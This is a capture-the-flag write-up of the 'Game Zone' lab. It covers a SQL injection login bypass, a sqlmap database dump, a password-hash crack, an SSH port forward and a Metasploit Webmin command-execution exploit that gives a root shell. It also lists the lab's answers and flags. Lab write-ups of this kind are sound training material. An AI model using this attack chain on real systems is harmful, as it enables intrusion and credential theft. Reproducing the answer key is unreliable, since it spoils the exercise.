# GAME ZONE

## BASIC INFO
```
export IP=10.10.213.12
```

## OBTAIN ACCESS VIA SQLi

Using the classic SQLi
```SQL
' OR 1 = 1; --
```

> - **When you've logged in, what page do you get redirected to?**
>> portal.php


## USING SQLMAP

```bash
sqlmap -u $IP/portal.php --method POST --data "searchitem=FUZZ" -p searchitem --cookie P
HPSESSID=bmob1asnnds79dm7i8nsuup0u0 --dbs --dbms mysql --level 2
```

> - **In the users table, what is the hashed password?**
>> ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

> - **What was the username associated with the hashed password?**
>> agent47

> - **What was the other table name?**
>> post

## CRACKING A PASSWORD WITH JOHN THE RIPPER

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-ShA256
```

> - **What is the de-hashed password?**
>> videogamer124

> - **Now you have a password and username. Try SSH'ing onto the machine.\
What is the user flag?**
>> 649ac17b1480ac13ef1e4fa579dac95c

## EXPOSING SERVICES WITH REVERSE SSH TUNNELS

Using `ss -tulpn` to see which socket is opened

> - **How any TCP sockets are running?**
>> 5

Service running on port 10000 is blocker via a firewall rule from outside. Run `ssh -L 10000:localhost:10000 agent47@$IP` on our host machine to exposes it to us locally.\
Then in browser, navigate to localhost:10000

> - **What is the name of the exposed CMS?**
>>webmin

> - **What is the CMS version?**
>>1.580

Log in with the credentials we got above


## PRIVILEGE ESCALATION WITH METASPLOIT

> - **What is the root flag?**
>> a4b945830144bdd71908d12d902adeee

Using searchsploit we know this version of webmin is vulnerable to `'/file/show.cgi' Remote Command Execution (Metasploit)`\
Fire up msfconsole, `use exploit/unix/webapp/webmin_show_cgi_exec`\
Then we set the RHOSTS to localhost, username to agent47 and password to videogamer124. Then the LHOST to tun0 and SSL to false.\
Now run the exploit and we should get a shell. `cat root.txt` once we got a shell.

![badges](../../../badges/dianchia.png)